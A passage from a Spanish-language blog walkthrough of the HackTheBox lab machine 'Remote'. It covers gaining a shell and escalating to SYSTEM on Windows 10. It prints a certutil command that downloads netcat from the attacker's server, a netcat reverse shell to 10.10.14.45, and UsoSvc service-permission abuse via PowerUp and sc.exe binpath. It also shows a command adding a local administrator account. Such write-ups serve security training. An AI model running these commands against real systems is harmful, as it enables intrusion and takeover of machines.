que es un sistema Windows 10 actualizado, y por defecto en las nuevas actualizaciones, Windows no esta aceptando el consumo de recursos SMB sin contraseña y deshabilito el SMBv2 (<a href="https://github.com/SecureAuthCorp/impacket/issues/599">https://github.com/SecureAuthCorp/impacket/issues/599</a>).</p></blockquote></ul><p>En este punto, intentamos ejecutar una Shell reversa con <strong>netcat</strong>, pero parece que por problemas con los caracteres de escape no funcionará, así que se decide no hacerlo de forma directa sino transferir al servidor el archivo y después ejecutarlo:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>cmd.exe /c certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.45/d14.ps1 C:<span class="se">\\</span>site_backups<span class="se">\\</span>nc.exe
</pre></table></code></div></div><p>Antes de eso, creamos el servidor <strong>HTTP</strong> y colocamos ahí nuestro ejecutable de <strong>netcat</strong>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python <span class="nt">-m</span> SimpleHTTPServer 80
</pre></table></code></div></div><p>Ahora que la Shell se encuentra en el servidor, la ejecutamos desde el exploit y recibimos la conexión a nuestro puerto 4646 con netcat</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-nvlp</span> 4646
<span class="gp">$</span><span class="w"> </span>nc.exe 10.10.14.45 4646 <span class="nt">-e</span> cmd.exe
</pre></table></code></div></div><p>Lo cual nos proporciona una Shell interactiva con el servidor victima y podemos capturar la flag de bajos privilegios <code class="language-plaintext highlighter-rouge">user.txt</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/12_user_txt.png" alt="Reverse Shell" /> <em>Reverse Shell con usuario de bajos privilegios</em></p><h2 id="elevación-de-privilegios">Elevación de privilegios</h2><p>Procedemos a subir el archivo <strong>PowerUp de powershell</strong>, que nos permitirá testear de forma automática diferentes vectores de escala de privilegios en sistemas Windows y obtenemos los siguientes resultados:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/13_powerup.png" alt="PowerUp" /> <em>PowerUp Windows</em></p><p>Como se puede observar, hay un hallazgo con el servicio <code class="language-plaintext highlighter-rouge">UsoSvc</code>, el cual no tiene adecuadamente configurado los permisos, así que después de mucho intentar, nos decantamos por esta posibilidad. Investigando un poco, se descubre que dicho servicio posee una vulnerabilidad reciente de <strong>escala de privilegios</strong>, la cual afecta a sistemas Windows 10 y viene vulnerable desde fábrica:</p><ul><li><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/</a></ul><p>La vulnerabilidad consiste puntualmente en el <strong>abuso de permisos en un servicio</strong>, en este caso un servicio propio de Windows. Por lo que podemos con los privilegios actuales, alterar la ruta del ejecutable del servicio e incrustar cualquier comando o acción. La explotación se puede realizar 2 maneras, una automática utilizando la funcionalidad <code class="language-plaintext highlighter-rouge">Invoke-ServiceAbuse</code> de <strong>PowerUp</strong> ó de forma manual, realizando la configuración y alterando la ruta.</p><ul><li>PowerUp<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">Powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="err">“</span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">/PowerUp.ps1</span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="err">”</span><span class="w">
</span></pre></table></code></div></div><li>Manual<div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">&gt;</span><span class="w"> </span>sc.exe stop UsoSvc
<span class="gp">&gt;</span><span class="w"> </span>sc.exe config UsoSvc <span class="nv">binpath</span><span class="o">=</span>”C:<span class="se">\U</span>sers<span class="se">\p</span>ublic<span class="se">\n</span>c.exe 10.10.14.45 4545 <span class="nt">-e</span> cmd.exe”
<span class="gp">&gt;</span><span class="w"> </span>sc.exe start UsoSvc
</pre></table></code></div></div></ul><p>Se podría decir que ambas maneras son lo mismo, pues la función de <strong>PowerUp</strong> realiza la parte manual, solamente que altera el comando a inyectar, creando un usuario y agregándolo al grupo de administrators:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">&gt;</span><span class="w"> </span>net user john Password123! <span class="o">&amp;&amp;</span> net localgroup administrators john /add”
</pre></table></code></div></div><p>En ambos casos la lógica es la misma, se detiene el servicio, se altera la ruta del binario o del comando a ejecutar y, como el servicio esta configurado para ejecutarse con privilegios de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, al reiniciarlo ejecutará nuestros comandos con ese nivel de privilegios, permitiéndonos de esta manera la escala de privilegios.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/htb/02_remote/14_elevacion_privilegios.png" alt="Elevación de Privilegios" /> <em>Elevación de Privilegios</em></p><p>Al final se obtuvo la conexión reversa con este nuevo nivel de privilegios y se logra la captura del flag <code class="language-plaintext highlighter-rouge">root.txt</code>.</p><p>Bytez ;)</p><h2 id="referencias-varias">Referencias Varias</h2><ol><li><a href="https://recipeforroot.com/runas/">https://recipeforroot.com/runas/</a><ul><li>Script para ejecutar un <strong>RunAS</strong> con powershell, utilizando credenciales de algún usuario.</ul><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><ul><li>Proyecto de búsqueda y enumeración de vectores para escala de privilegios en Windows, interesante como alternativa a PowerUp.</ul><li><a href="https://book.hacktricks.xyz/shells/windows">https://book.hacktricks.xyz/shells/windows</a><ul><li>o Un blog bastante interesante en seguridad; diferentes alternativas a shell reverse en sistemas windows.</ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources</a><ul><li>EXCELENTE MATERIAL DE ESTUDIO! Muy recomendado ;)</ul></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/medium/'>Medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/usosvc/" class="post-tag no-text-decoration" >UsoSvc</a> <a href="/tags/servicesup/" class="post-tag no-text-decoration" >ServicesUP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB-REMOTE - CSL&url=https://csl-labs.github.io/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB-REMOTE - CSL&u=https://csl-labs.github.io/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB-REMOTE - CSL&url=https://csl-labs.github.io/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizada Recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-nest/">HTB-NEST</a><li><a href="/posts/htb-openadmin/">HTB-OPENADMIN</a><li><a href="/posts/htb-sauna/">HTB-SAUNA</a></ul></div><div id="access-tags"> <span>Tags Relevantes</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Tabla de Contenido</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Otras Publicaciones</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-nest/"><div class="card-body"> <span class="timeago small" > Nov 26, 2020 <i class="unloaded">2020-11-26T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-NEST</h3><div class="text-muted small"><p> Decripción del entorno Atacante OS Kali Linux IP 10.10.14.199 Maquina Objetivo OS Windows IP 10.10....</p></div></div></a></div><div class="card"> <a href="/posts/htb-sauna/"><div class="card-body"> <span class="timeago small" > Nov 22, 2020 <i class="unloaded">2020-11-22T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-SAUNA</h3><div class="text-muted small"><p> Decripción del entorno Atacante OS Kali Linux IP 10.10.15.131 Maquina Objetivo OS Windows IP 10.10....</p></div></div></a></div><div class="card"> <a href="/posts/htb-traceback/"><div class="card-body"> <span class="timeago small" > Nov 19, 2020 <i class="unloaded">2020-11-19T14:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-TRACEBACK</h3><div class="text-muted small"><p> Decripción del entorno Atacante OS Kali Linux IP 10.10.15.14 Maquina Objetivo OS Linux IP 10.10.10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-traceback/" class="btn btn-outline-primary"><p>HTB-TRACEBACK</p></a> <a href="/posts/htb-sauna/" class="btn btn-outline-primary"><p>HTB-SAUNA</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/CsLcol">CSL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Tags Relevantes</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/ad/">AD</a> <a class="post-tag" href="/tags/blind-sql/">blind sql</a> <a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/decompiling/">decompiling</a> <a class="post-tag" href="/tags/journalctl/">journalctl</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/nodejs/">NodeJS</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://csl-labs.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
